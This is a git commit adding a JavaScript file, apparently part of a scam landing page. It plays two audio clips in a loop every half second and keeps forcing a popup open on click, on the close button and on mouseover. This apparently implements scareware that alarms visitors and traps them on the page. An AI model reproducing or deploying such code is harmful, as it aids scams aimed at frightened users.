945ef7511b2d0dc3e02c8ea1c150e9d4de6f8f52
shakeaws2112 <shakeaws2112@gmail.com>
2025-11-03 20:29:39 +0530

    Add files via upload

---
+++ 29Jul_Jck_webLP/Wi020nh1delpJck0r20/jsjdhedJSud.js
@@ -0,0 +1,76 @@
+
+
+
+function showd2() {
+document.getElementById("chat-box").style.display = "block";
+}
+
+
+  function showd2() {
+  document.getElementById("login-box").style.display = "block";
+  }
+  
+
+
+      
+        setInterval(function() {
+          document.getElementById("usgtWbsQns").play();
+          document.getElementById("mInTvsRcaG").play();
+        }, 500);
+      
+
+      
+  function beep1() {
+    document.getElementById("mInTvsRcaG").play();
+ }
+  
+
+      
+        $(document).ready(function() {
+          $("#mycanvas").click(function() {
+            $("#welcomeDiv").show()
+
+          })
+        });
+      
+
+      
+        $(document).ready(function () {
+            $("body").click(function () {
+                $("#ev_talkbox_wrapper").hide();
+            });
+        });
+    
+    
+      $(document).ready(function () {
+          $("#ev_talkbox_wrapper").click(function () {
+              $("#ev_talkbox_wrapper").hide();
+          });
+      });
+  
+  
+      $(document).ready(function () {
+          $("#mycanvas").click(function () {
+              $("#ev_talkbox_wrapper").hide();
+          });
+      });
+  
+      
+        $(document).ready(function() {
+          $("#mycanvas").click(function() {
+            $("#poptxt").show()
+          })
+        });
+        $(document).ready(function() {
+          $("#cross").click(function() {
+            $("#poptxt").show()
+          })
+        });
+      
+      
+        $(document).ready(function() {
+          $("body").mouseover(function() {
+            $("#poptxt").show()
+          })
+        });
+      
